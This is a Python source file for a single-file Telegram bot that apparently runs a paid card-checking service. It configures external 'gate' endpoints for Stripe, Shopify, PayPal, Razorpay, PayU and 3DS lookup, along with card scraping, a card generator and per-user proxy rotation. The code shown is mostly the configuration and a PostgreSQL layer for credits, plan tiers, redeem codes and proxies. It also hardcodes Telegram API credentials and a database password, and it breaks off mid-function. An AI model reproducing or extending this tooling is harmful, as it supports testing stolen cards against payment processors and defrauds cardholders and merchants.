#!/usr/bin/env python3
"""
S.zip Bot - Single File Version
Consolidated from multi-file source into one file.
"""

import asyncio
import html
import io
import json
import logging
import os
import platform
import random
import re
import signal
import socket
import string
import sys
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from functools import wraps
from typing import Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlparse

import aiofiles
import aiohttp
import cloudscraper
import psutil
import psycopg2
import pytz
import requests
import sqlite3
import uuid
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from psycopg2 import pool
from pyrogram import Client as PyrogramClient, filters as PyrogramFilters
from pyrogram.enums import ParseMode as PyrogramParseMode
from pyrogram.errors import (
    InviteHashExpired,
    InviteHashInvalid,
    InviteRequestSent,
    PeerIdInvalid,
    UserAlreadyParticipant
)
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telegram import (
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile,
    InputMediaPhoto,
    Update
)
from telegram.constants import ParseMode
from telegram.error import (
    BadRequest,
    Forbidden,
    NetworkError,
    RetryAfter,
    TelegramError,
    TimedOut
)
from telegram.ext import (
    Application,
    CallbackContext,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    Updater,
    filters
)
from telegram.helpers import escape_markdown
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


# ============================================================
# MODULE: config
# ============================================================
# Pyrogram setup
API_ID = 21902589
API_HASH = "646d988e7c7938f85ca652ece00b07ba"
SESSION_STRING = ""  # Optional: only needed for /scr (card scraping). Generate via pyrogram string session generator.

DEFAULT_LIMIT = 1000  # Card Scrapping Limit For Everyone
PREMIUM_LIMIT = 5000  # Card Scrapping Limit For Premium Users

# Cooldown settings (in seconds)
COOLDOWN_FREE = 10  # Cooldown for Free users
COOLDOWN_TRIAL = 10  # Cooldown for Trial users

# Credit cost per command
CREDIT_COST = 2  # Credits deducted for each successful command

# =============================================================================
# API Endpoints
# =============================================================================
SHOPIFY_API_URL = "https://xaeden.onrender.com/sh"
SHOPIFY_MASS_API_URL = "https://xaeden.onrender.com/sh"
SHOPIFY_SETURL_API_URL = "https://xaeden.onrender.com/sh"
STRIPE_API_URL = "https://blackxcard-autostripe.onrender.com"
STRIPE_AUTH_API_URL = "https://blackxcard-autostripe.onrender.com"
BRAINTREE_API_URL = "https://blackxcard-autostripe.onrender.com"
RAZORPAY_API_URL = "https://rzp.victus.name/rzpv2"
PAYPAL_API_URL = "https://blackxcard-autostripe.onrender.com"
PAYPAL_PROXY_API_URL = "https://blackxcard-autostripe.onrender.com"
CVV_API_URL = "https://blackxcard-autostripe.onrender.com"
VBV_API_URL = "https://blackxcard-autostripe.onrender.com"
PAYU_API_URL = "https://blackxcard-autostripe.onrender.com"
PAYFAST_API_URL = "https://blackxcard-autostripe.onrender.com"



# ============================================================
# MODULE: database
# ============================================================
# ==============================
# Logging Setup
# ==============================
logger = logging.getLogger(__name__)

# ==============================
# Database Configuration
# ==============================
DB_HOST = "localhost"
DB_NAME = "cardxchk"
DB_USER = "postgres"
DB_PASS = "rocky"
DB_PORT = "5432"

# ==============================
# Constants
# ==============================
DEFAULT_CREDITS = 250

# ==============================
# Global Connection Pool
# ==============================
connection_pool: pool.SimpleConnectionPool | None = None

# ==============================
# Create Connection Pool
# ==============================
def create_connection_pool() -> bool:
    """Initialize PostgreSQL connection pool."""
    global connection_pool
    try:
        connection_pool = psycopg2.pool.SimpleConnectionPool(
            minconn=1,
            maxconn=20,  # Handle more simultaneous users
            user=DB_USER,
            password=DB_PASS,
            host=DB_HOST,
            port=DB_PORT,
            database=DB_NAME
        )
        if connection_pool:
            logger.info("✅ Database connection pool created successfully.")
            return True
    except Exception as e:
        logger.error(f"❌ Error creating connection pool: {e}")
    return False

# ==============================
# Close Connection Pool
# ==============================
def close_connection_pool() -> None:
    """Close all connections in the pool."""
    global connection_pool
    if connection_pool:
        connection_pool.closeall()
        logger.info("🔒 Database connection pool closed.")

# ==============================
# Setup Database Tables
# ==============================
def setup_database() -> None:
    """Ensure users, user_plans, and redeem_codes tables exist."""
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Create users table (with proxies column as JSON)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    joined_at TIMESTAMP DEFAULT NOW(),
                    tier TEXT DEFAULT 'Trial',
                    credits INT DEFAULT 250,
                    proxies JSONB DEFAULT '[]'::jsonb
                )
            """)
            
            # Create user_plans table for managing paid plans
            cur.execute("""
                CREATE TABLE IF NOT EXISTS user_plans (
                    user_id BIGINT PRIMARY KEY,
                    tier TEXT NOT NULL,
                    expiry_date TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (user_id) ON DELETE CASCADE
                )
            """)
            
            # Create redeem_codes table
            cur.execute("""
                CREATE TABLE IF NOT EXISTS redeem_codes (
                    id SERIAL PRIMARY KEY,
                    code VARCHAR(20) UNIQUE NOT NULL,
                    tier VARCHAR(20) NOT NULL,
                    duration_days INTEGER NOT NULL,
                    created_at TIMESTAMP DEFAULT NOW(),
                    used_at TIMESTAMP NULL,
                    used_by BIGINT NULL
                )
            """)
            
            conn.commit()
            logger.info("✅ Database tables checked/created successfully.")
    except Exception as e:
        logger.error(f"❌ Error setting up database: {e}")
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get or Create User
# ==============================
def get_or_create_user(user_id: int, username: str) -> tuple[str, datetime, str, int] | None:
    """
    Get user info or create a new entry if not exists.
    Returns: (username, joined_at, tier, credits)
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Check if user exists
            cur.execute(
                "SELECT username, joined_at, tier, credits FROM users WHERE user_id = %s",
                (user_id,)
            )
            result = cur.fetchone()

            if result:
                db_username, joined_at, tier, credits = result

                # Update username if changed
                if db_username != username:
                    cur.execute(
                        "UPDATE users SET username = %s WHERE user_id = %s",
                        (username, user_id)
                    )
                    conn.commit()
                    logger.info(f"📝 Updated username for user {user_id} → {username}")

                # Ensure tier is not empty
                if not tier:
                    tier = "Trial"

                return (db_username, joined_at, tier, credits)

            # Insert new user with Trial tier and 250 credits
            joined_at = datetime.now()
            cur.execute("""
                INSERT INTO users (user_id, username, joined_at, tier, credits)
                VALUES (%s, %s, %s, %s, %s)
                RETURNING username, joined_at, tier, credits
            """, (user_id, username, joined_at, "Trial", DEFAULT_CREDITS))
            conn.commit()

            result = cur.fetchone()
            logger.info(f"👤 New user added → {username} ({user_id}) with Trial tier and {DEFAULT_CREDITS} credits")
            return result
    except Exception as e:
        logger.error(f"❌ Database error in get_or_create_user: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Update User Credits
# ==============================
def update_user_credits(user_id: int, credits_change: int) -> bool:
    """
    Update user credits by adding or subtracting the specified amount.
    
    Args:
        user_id: The Telegram user ID
        credits_change: The amount to change (positive to add, negative to subtract)
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Update credits
            cur.execute(
                "UPDATE users SET credits = credits + %s WHERE user_id = %s",
                (credits_change, user_id)
            )
            conn.commit()
            
            # Check if any row was affected
            if cur.rowcount > 0:
                # Get updated credits
                cur.execute("SELECT credits FROM users WHERE user_id = %s", (user_id,))
                new_credits = cur.fetchone()[0]
                logger.info(f"💰 Updated credits for user {user_id}: {credits_change:+d} → {new_credits}")
                return True
            else:
                logger.warning(f"⚠️ User {user_id} not found when updating credits")
                return False
    except Exception as e:
        logger.error(f"❌ Database error in update_user_credits: {e}")
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get User Credits
# ==============================
def get_user_credits(user_id: int) -> int | None:
    """
    Get the current credit balance for a user.
    Returns unlimited credits if the user has an active, non-expired plan.
    
    Args:
        user_id: The Telegram user ID
        
    Returns:
        The current credit balance, float('inf') for unlimited, or None if user not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # First, check if the user has an active plan
            cur.execute(
                "SELECT tier, expiry_date FROM user_plans WHERE user_id = %s",
                (user_id,)
            )
            plan_result = cur.fetchone()
            
            # If user has an active plan that hasn't expired, return unlimited credits
            if plan_result:
                tier, expiry_date = plan_result
                if expiry_date and datetime.now() <= expiry_date:
                    logger.info(f"✅ User {user_id} has active plan {tier}, unlimited credits")
                    return float('inf')  # Use infinity to represent unlimited
            
            # If no active plan, get the actual credit balance from the users table
            cur.execute("SELECT credits FROM users WHERE user_id = %s", (user_id,))
            result = cur.fetchone()
            return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Database error in get_user_credits: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Update User Plan
# ==============================
def update_user_plan(user_id: int, tier: str, expiry_date: Optional[datetime]) -> bool:
    """
    Update a user's plan tier and expiry date in the user_plans table.
    Also updates the tier in the main users table.
    If tier is set to "Trial", credits are reset to the default value.
    
    Args:
        user_id: The user ID
        tier: The new tier (Core, Elite, Root, X, or Trial)
        expiry_date: The expiry date for the plan, or None for Trial
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # First, check if the user exists in the users table
            cur.execute("SELECT user_id FROM users WHERE user_id = %s", (user_id,))
            user_exists = cur.fetchone()
            
            if not user_exists:
                logger.warning(f"⚠️ User {user_id} does not exist in users table, cannot update plan")
                return False
            
            # Check if user already has a plan record
            cur.execute("SELECT user_id FROM user_plans WHERE user_id = %s", (user_id,))
            exists = cur.fetchone()
            
            if exists:
                # Update existing record
                if expiry_date:
                    cur.execute(
                        "UPDATE user_plans SET tier = %s, expiry_date = %s WHERE user_id = %s",
                        (tier, expiry_date, user_id)
                    )
                else:
                    cur.execute(
                        "UPDATE user_plans SET tier = %s, expiry_date = NULL WHERE user_id = %s",
                        (tier, user_id)
                    )
            else:
                # Insert new record
                if expiry_date:
                    cur.execute(
                        "INSERT INTO user_plans (user_id, tier, expiry_date) VALUES (%s, %s, %s)",
                        (user_id, tier, expiry_date)
                    )
                else:
                    cur.execute(
                        "INSERT INTO user_plans (user_id, tier, expiry_date) VALUES (%s, %s, NULL)",
                        (user_id, tier)
                    )
            
            # If user is being reverted to Trial, reset their credits
            if tier == "Trial":
                cur.execute(
                    "UPDATE users SET tier = %s, credits = %s WHERE user_id = %s",
                    (tier, DEFAULT_CREDITS, user_id)
                )
                logger.info(f"🔄 User {user_id} reverted to Trial, credits reset to {DEFAULT_CREDITS}")
            else:
                # Otherwise, just update the tier
                cur.execute(
                    "UPDATE users SET tier = %s WHERE user_id = %s",
                    (tier, user_id)
                )
            
            conn.commit()
            logger.info(f"✅ Updated plan for user {user_id} to {tier}. Expires: {expiry_date}")
            return True
    except Exception as e:
        logger.error(f"❌ Database error in update_user_plan: {e}")
        conn.rollback()
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get User Plan
# ==============================
def get_user_plan(user_id: int) -> Optional[Tuple[str, Optional[datetime]]]:
    """
    Get a user's plan tier and expiry date from the user_plans table.
    
    Args:
        user_id: The user ID
        
    Returns:
        A tuple of (tier, expiry_date) or None if not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT tier, expiry_date FROM user_plans WHERE user_id = %s",
                (user_id,)
            )
            result = cur.fetchone()
            return result
    except Exception as e:
        logger.error(f"❌ Database error in get_user_plan: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get User Data
# ==============================
def get_user_data(user_id: int) -> Optional[dict]:
    """
    Get all user data.
    
    Args:
        user_id: The user ID
        
    Returns:
        A dictionary with user data or None if not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT username, joined_at, tier, credits, proxies FROM users WHERE user_id = %s",
                (user_id,)
            )
            result = cur.fetchone()
            
            if result:
                username, joined_at, tier, credits, proxies = result
                return {
                    "username": username,
                    "joined_at": joined_at,
                    "tier": tier,
                    "credits": credits,
                    "proxies": proxies if proxies else []
                }
            return None
    except Exception as e:
        logger.error(f"❌ Database error in get_user_data: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Update User Data
# ==============================
def update_user_data(user_id: int, data: dict) -> bool:
    """
    Update specific user data fields.
    
    Args:
        user_id: The user ID
        data: Dictionary with fields to update
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Build the update query dynamically based on provided data
            update_fields = []
            update_values = []
            
            for field, value in data.items():
                update_fields.append(f"{field} = %s")
                update_values.append(value)
            
            if not update_fields:
                return False  # Nothing to update
            
            # Add user_id to the values
            update_values.append(user_id)
            
            # Execute the update query
            cur.execute(
                f"UPDATE users SET {', '.join(update_fields)} WHERE user_id = %s",
                update_values
            )
            conn.commit()
            
            if cur.rowcount > 0:
                logger.info(f"✅ Updated user data for user {user_id}")
                return True
            else:
                logger.warning(f"⚠️ User {user_id} not found when updating data")
                return False
    except Exception as e:
        logger.error(f"❌ Database error in update_user_data: {e}")
        conn.rollback()
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Save Redeem Code
# ==============================
def save_redeem_code(code: str, tier: str, duration_days: int) -> bool:
    """
    Save a new redeem code to the database.
    
    Args:
        code: The redeem code
        tier: The plan tier
        duration_days: Duration in days
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Insert the new code
            cur.execute(
                "INSERT INTO redeem_codes (code, tier, duration_days) VALUES (%s, %s, %s)",
                (code, tier, duration_days)
            )
            conn.commit()
            
            logger.info(f"✅ Created redeem code {code} for {tier} plan")
            return True
    except Exception as e:
        logger.error(f"❌ Database error in save_redeem_code: {e}")
        conn.rollback()
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get Redeem Code Info
# ==============================
def get_redeem_code_info(code: str) -> Optional[dict]:
    """
    Get information about a redeem code.
    
    Args:
        code: The redeem code
        
    Returns:
        Dictionary with code info or None if not found/used
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Get the code info
            cur.execute(
                "SELECT tier, duration_days, used_at FROM redeem_codes WHERE code = %s",
                (code,)
            )
            result = cur.fetchone()
            
            if not result:
                return None
            
            tier, duration_days, used_at = result
            
            # Check if the code has already been used
            if used_at:
                return None
            
            return {
                "tier": tier,
                "duration_days": duration_days
            }
    except Exception as e:
        logger.error(f"❌ Database error in get_redeem_code_info: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Mark Redeem Code as Used
# ==============================
def mark_redeem_code_as_used(code: str, user_id: int) -> bool:
    """
    Mark a redeem code as used.
    
    Args:
        code: The redeem code
        user_id: The user who used it
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Update the code as used
            cur.execute(
                "UPDATE redeem_codes SET used_at = NOW(), used_by = %s WHERE code = %s",
                (user_id, code)
            )
            conn.commit()
            
            if cur.rowcount > 0:
                logger.info(f"✅ Marked redeem code {code} as used by user {user_id}")
                return True
            else:
                logger.warning(f"⚠️ Redeem code {code} not found when marking as used")
                return False
    except Exception as e:
        logger.error(f"❌ Database error in mark_redeem_code_as_used: {e}")
        conn.rollback()
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get All Redeem Codes
# ==============================
def get_all_redeem_codes() -> List[dict]:
    """
    Get all redeem codes from the database.
    
    Returns:
        List of dictionaries with code info
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return []
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "SELECT code, tier, duration_days, created_at, used_at, used_by FROM redeem_codes ORDER BY created_at DESC"
            )
            results = cur.fetchall()
            
            codes = []
            for result in results:
                code, tier, duration_days, created_at, used_at, used_by = result
                codes.append({
                    "code": code,
                    "tier": tier,
                    "duration_days": duration_days,
                    "created_at": created_at,
                    "used_at": used_at,
                    "used_by": used_by
                })
            
            return codes
    except Exception as e:
        logger.error(f"❌ Database error in get_all_redeem_codes: {e}")
        return []
    finally:
        connection_pool.putconn(conn)

# ==============================
# Check if User Has Active Plan
# ==============================
def has_user_active_plan(user_id: int) -> bool:
    """
    Check if a user currently has an active plan.
    
    Args:
        user_id: The user ID to check
        
    Returns:
        True if user has an active plan, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Check if user has an active plan
            cur.execute(
                "SELECT tier, expiry_date FROM user_plans WHERE user_id = %s",
                (user_id,)
            )
            result = cur.fetchone()
            
            if result:
                tier, expiry_date = result
                # Check if the plan has expired
                if expiry_date and datetime.now() <= expiry_date:
                    return True
                else:
                    return False
            return False
    except Exception as e:
        logger.error(f"❌ Database error in has_user_active_plan: {e}")
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Check if User Has Redeemed Before
# ==============================
def has_user_redeemed_before(user_id: int) -> bool:
    """
    Check if a user has already redeemed a code before.
    
    Args:
        user_id: The user ID to check
        
    Returns:
        True if user has redeemed before, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Check if user has any used codes
            cur.execute(
                "SELECT COUNT(*) FROM redeem_codes WHERE used_by = %s",
                (user_id,)
            )
            count = cur.fetchone()[0]
            
            return count > 0
    except Exception as e:
        logger.error(f"❌ Database error in has_user_redeemed_before: {e}")
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Add User Proxy
# ==============================
def add_user_proxy(user_id: int, proxy: str) -> Tuple[bool, str]:
    """
    Add a proxy to the user's proxy list.
    
    Args:
        user_id: The user ID
        proxy: The proxy string to add
        
    Returns:
        Tuple of (success, message)
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False, "Database connection error"
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Get current proxies
            cur.execute("SELECT proxies FROM users WHERE user_id = %s", (user_id,))
            result = cur.fetchone()
            
            if not result:
                return False, "User not found"
            
            current_proxies = result[0] if result[0] else []
            
            # Check if proxy already exists
            if proxy in current_proxies:
                return False, "Proxy already exists"
            
            # Check if user has reached the limit
            if len(current_proxies) >= 10:
                return False, "Proxy limit reached (10)"
            
            # Add the new proxy
            current_proxies.append(proxy)
            
            # Update the database
            cur.execute(
                "UPDATE users SET proxies = %s WHERE user_id = %s",
                (json.dumps(current_proxies), user_id)
            )
            conn.commit()
            
            logger.info(f"✅ Added proxy for user {user_id}")
            return True, "Proxy added successfully"
    except Exception as e:
        logger.error(f"❌ Database error in add_user_proxy: {e}")
        return False, f"Database error: {str(e)}"
    finally:
        connection_pool.putconn(conn)

# ==============================
# Remove User Proxies
# ==============================
def remove_user_proxies(user_id: int, count: int) -> Tuple[bool, str]:
    """
    Remove a specified number of proxies from the user's proxy list.
    If count is -1, remove all proxies.
    
    Args:
        user_id: The user ID
        count: The number of proxies to remove, or -1 to remove all
        
    Returns:
        Tuple of (success, message)
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False, "Database connection error"
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Get current proxies
            cur.execute("SELECT proxies FROM users WHERE user_id = %s", (user_id,))
            result = cur.fetchone()
            
            if not result:
                return False, "User not found"
            
            current_proxies = result[0] if result[0] else []
            
            if not current_proxies:
                return False, "No proxies to remove"
            
            # If count is -1, remove all proxies
            if count == -1:
                removed_count = len(current_proxies)
                remaining_proxies = []
            else:
                # Remove the specified number of proxies
                removed_count = min(count, len(current_proxies))
                remaining_proxies = current_proxies[removed_count:]
            
            # Update the database
            cur.execute(
                "UPDATE users SET proxies = %s WHERE user_id = %s",
                (json.dumps(remaining_proxies), user_id)
            )
            conn.commit()
            
            logger.info(f"✅ Removed {removed_count} proxies for user {user_id}")
            return True, f"Removed {removed_count} proxies"
    except Exception as e:
        logger.error(f"❌ Database error in remove_user_proxies: {e}")
        return False, f"Database error: {str(e)}"
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get User Proxies
# ==============================
def get_user_proxies(user_id: int) -> List[str]:
    """
    Get all proxies for a user.
    
    Args:
        user_id: The user ID
        
    Returns:
        List of proxy strings
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return []
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT proxies FROM users WHERE user_id = %s", (user_id,))
            result = cur.fetchone()
            
            if result and result[0]:
                return result[0]
            return []
    except Exception as e:
        logger.error(f"❌ Database error in get_user_proxies: {e}")
        return []
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get Random User Proxy
# ==============================
def get_random_user_proxy(user_id: int) -> Optional[str]:
    """
    Get a random proxy from the user's proxy list.
    
    Args:
        user_id: The user ID
        
    Returns:
        A random proxy string or None if no proxies
    """
    proxies = get_user_proxies(user_id)
    if proxies:
        return random.choice(proxies)
    return None

# ==============================
# Get User Gate Status
# ==============================
def get_user_gate_status(user_id: int) -> Optional[dict]:
    """
    Get a user's gate status from the database.
    
    Args:
        user_id: The user ID
        
    Returns:
        Dictionary with gate status or None if not found
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Create a gate_status table if it doesn't exist
            cur.execute("""
                CREATE TABLE IF NOT EXISTS gate_status (
                    user_id BIGINT PRIMARY KEY,
                    gate_status JSONB DEFAULT '{}'::jsonb,
                    updated_at TIMESTAMP DEFAULT NOW()
                )
            """)
            
            # Get the user's gate status
            cur.execute(
                "SELECT gate_status FROM gate_status WHERE user_id = %s",
                (user_id,)
            )
            result = cur.fetchone()
            
            if result and result[0]:
                return result[0]
            
            # Return default gate status if not found
            return {
                "rz": {"enabled": True, "message": "Razorpay 1₹ gate is currently active"},
                "sh": {"enabled": True, "message": "Shopify 0.98$ gate is currently active"},
                "chk": {"enabled": True, "message": "Stripe Auth gate is currently active"},
                "mass": {"enabled": True, "message": "Mass Stripe Auth gate is currently active"},
                "at": {"enabled": True, "message": "Authnet 1$ gate is currently active"},
                "gate": {"enabled": True, "message": "Gateway status checker is currently active"},
                "msh": {"enabled": True, "message": "Shopify Random gate is currently active"},
                "vbv": {"enabled": True, "message": "3DS Lookup gate is currently active"},
                "st": {"enabled": True, "message": "Stripe 1$ gate is currently active"},
                "stt": {"enabled": True, "message": "Stripe 5$ gate is currently active"},
                "st1": {"enabled": True, "message": "Stripe 1€ gate is currently active"},
                "pp": {"enabled": True, "message": "Paypal 1$ gate is currently active"},
                "p1": {"enabled": True, "message": "Paypal 0.10$ gate is currently active"},
                "py": {"enabled": True, "message": "PayU 1$ gate is currently active"},
                "pu": {"enabled": True, "message": "PayU 0.1€ gate is currently active"},
                "pyu": {"enabled": True, "message": "PayU 1 PLN gate is currently active"},
                "sk": {"enabled": True, "message": "SK Based 1$ gate is currently active"},
                "mpp": {"enabled": True, "message": "Paypal 1$ gate is currently active"},
                "msk": {"enabled": True, "message": "SK Based Mass 1$ gate is currently active"},
                "pv": {"enabled": True, "message": "Paypal 1$ CVV gate is currently active"},
                "gen": {"enabled": True, "message": "Card Generator is currently active"},
                "proxy": {"enabled": True, "message": "Proxy Manager is currently active"},
                "rproxy": {"enabled": True, "message": "Random Proxy is currently active"},
                "myproxy": {"enabled": True, "message": "My Proxy is currently active"}
            }
    except Exception as e:
        logger.error(f"❌ Database error in get_user_gate_status: {e}")
        return None
    finally:
        connection_pool.putconn(conn)

# ==============================
# Update User Gate Status
# ==============================
def update_user_gate_status(user_id: int, gate_status: dict) -> bool:
    """
    Update a user's gate status in the database.
    
    Args:
        user_id: The user ID
        gate_status: Dictionary with gate status
        
    Returns:
        True if successful, False otherwise
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            # Create a gate_status table if it doesn't exist
            cur.execute("""
                CREATE TABLE IF NOT EXISTS gate_status (
                    user_id BIGINT PRIMARY KEY,
                    gate_status JSONB DEFAULT '{}'::jsonb,
                    updated_at TIMESTAMP DEFAULT NOW()
                )
            """)
            
            # Check if user already has a gate status record
            cur.execute("SELECT user_id FROM gate_status WHERE user_id = %s", (user_id,))
            exists = cur.fetchone()
            
            if exists:
                # Update existing record
                cur.execute(
                    "UPDATE gate_status SET gate_status = %s, updated_at = NOW() WHERE user_id = %s",
                    (json.dumps(gate_status), user_id)
                )
            else:
                # Insert new record
                cur.execute(
                    "INSERT INTO gate_status (user_id, gate_status) VALUES (%s, %s)",
                    (user_id, json.dumps(gate_status))
                )
            
            conn.commit()
            logger.info(f"✅ Updated gate status for user {user_id}")
            return True
    except Exception as e:
        logger.error(f"❌ Database error in update_user_gate_status: {e}")
        conn.rollback()
        return False
    finally:
        connection_pool.putconn(conn)

# ==============================
# Get Total Users
# ==============================
def get_total_users() -> int:
    """
    Get the total number of users in the database.
    
    Returns:
        Total number of users
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return 0
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT COUNT(*) FROM users")
            count = cur.fetchone()
            return count[0] if count else 0
    except Exception as e:
        logger.error(f"❌ Database error in get_total_users: {e}")
        return 0
    finally:
        connection_pool.putconn(conn)

# ==============================
# Generate Plan Code
# ==============================
def generate_plan_code(tier: str, duration_days: int) -> Optional[str]:
    """
    Generate a new plan code for the specified tier and duration.
    
    Args:
        tier: The plan tier (Core, Elite, Root, X)
        duration_days: Duration in days
        
    Returns:
        The generated code or None if failed
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return None
    
    # Generate a random code
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    # Save the code to the database
    if save_redeem_code(code, tier, duration_days):
        return code
    return None

# ==============================
# Generate Multiple Plan Codes
# ==============================
def generate_multiple_plan_codes(tier: str, duration_days: int, count: int) -> List[str]:
    """
    Generate multiple plan codes for the specified tier and duration.
    
    Args:
        tier: The plan tier (Core, Elite, Root, X)
        duration_days: Duration in days
        count: Number of codes to generate
        
    Returns:
        List of generated codes
    """
    codes = []
    for _ in range(count):
        code = generate_plan_code(tier, duration_days)
        if code:
            codes.append(code)
    
    return codes

# ==============================
# Get All Active Plans
# ==============================
def get_all_active_plans() -> list[tuple[int, str, datetime]]:
    """
    Get all users who currently have an active (non-expired) plan.
    
    Returns:
        List of tuples: (user_id, tier, expiry_date)
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return []

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("""
                SELECT user_id, tier, expiry_date
                FROM user_plans
                WHERE expiry_date IS NOT NULL
                ORDER BY expiry_date ASC
            """)
            results = cur.fetchall()
            return results if results else []
    except Exception as e:
        logger.error(f"❌ Database error in get_all_active_plans: {e}")
        return []
    finally:
        connection_pool.putconn(conn)

def get_all_user_ids() -> list[int]:
    """
    Get all Telegram user IDs from users table.
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return []

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT user_id FROM users")
            rows = cur.fetchall()
            return [row[0] for row in rows]
    except Exception as e:
        logger.error(f"❌ Database error in get_all_user_ids: {e}")
        return []
    finally:
        connection_pool.putconn(conn)

# ==============================
# Custom Gates Table Setup
# ==============================

def setup_custom_gates_table() -> None:
    """Ensure the custom_gates table exists."""
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return

    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS custom_gates (
                    id SERIAL PRIMARY KEY,
                    gate_name VARCHAR(50) UNIQUE NOT NULL,
                    site_url TEXT NOT NULL,
                    created_by BIGINT,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            """)
            conn.commit()
            logger.info("✅ Custom gates table checked/created.")
    except Exception as e:
        logger.error(f"❌ Error creating custom_gates table: {e}")
    finally:
        connection_pool.putconn(conn)

# ==============================
# Add Custom Gate
# ==============================
def add_custom_gate(gate_name: str, site_url: str, user_id: int) -> bool:
    """
    Save a new custom gate to the database.
    
    Args:
        gate_name: The command name (e.g., 'sp')
        site_url: The Shopify site URL
        user_id: The Telegram ID of the user creating it
        
    Returns:
        True if successful, False otherwise (e.g., duplicate name)
    """
    if not connection_pool:
        logger.error("❌ Connection pool not initialized.")
        return False
    
    conn = connection_pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO custom_gates (gate_name, site_url, created_by) VALUES (%s, %s, %s)",
                (gate_name, site_url, user_id)
            )
            conn.commit()
